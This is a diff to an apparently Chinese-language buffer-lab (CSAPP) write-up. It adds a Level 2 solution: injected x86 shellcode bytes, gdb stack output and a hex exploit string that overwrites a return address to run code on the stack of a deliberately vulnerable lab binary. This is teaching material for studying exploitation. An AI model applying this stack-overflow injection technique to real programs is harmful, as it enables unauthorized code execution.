@@ -33,7 +33,8 @@ $1 = {<text variable, no debug info>} 0x8048c18 <smoke>
 00 00 00 00
 18 8c 04 08
 ```
-![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image0.png)
+
+![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image1.png)
 
 ## Level 1: Sparkler (10 pts)
 同level_0的要求，这次需要跳转到fizz函数内
@@ -67,8 +68,63 @@ exit(0);
 00 00 00 00
 b8 da 18 28
 ```
-![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image0.png)
+
+![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image2.png)
 
 ## Level 2: Firecracker (15 pts)
+题目要求和上面的一样，跳转到bang函数上
+查看bang函数源码
+```
+int global_value = 0;
+void bang(int val)
+{
+if (global_value == cookie) {
+printf("Bang!: You set global_value to 0x%x\n", global_value);
+validate(2);
+} else
+printf("Misfire: global_value = 0x%x\n", global_value);
+exit(0);
+}
+```
+可以看到需要让全局变量global_value的值和cookie值相同，并且writeup中的提示让我们进行code-injection
+与attack-lab的做法一样，通过注入代码后控制eip跳转到我们注入代码的位置
+构造如下汇编代码令global_value的值等于cookie
+```
+mov    $0x2818dab8, %eax //eax = cookie
+mov    %eax, 0x0804D100  //0x0804D100 --> [global_value_address] = cookie
+push   $0x08048c9d       //bang_address
+ret
 
+```
+使用gcc将其转变为
+```
+b8 b8 da 18 
+28 89 04 25
+00 d1 04 08 
+68 9d 8c 04 
+08 c3
+```
+通过gdb调试获得注入代码的位置
+```
+pwndbg> x/20gx $esp
+0x556837c8 <_reserved+1038280>:	0xf7fb6404556837d8	0xbf153c007f87426a
+0x556837d8 <_reserved+1038296>:	0x2504892818dab8b8	0x048c9d680804d100
+0x556837e8 <_reserved+1038312>:	0x000000000000c308	0x0000000000000000
+```
+可以看到注入位置在0x556837d8处，然后我们就可以构造hex完成本题了
+```
+b8 b8 da 18 
+28 89 04 25
+00 d1 04 08 
+68 9d 8c 04 
+08 c3 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+d8 37 68 55
+```
 
+![avatar](https://github.com/AmaIIl/buffer-lab/blob/gh-pages/image3.png)
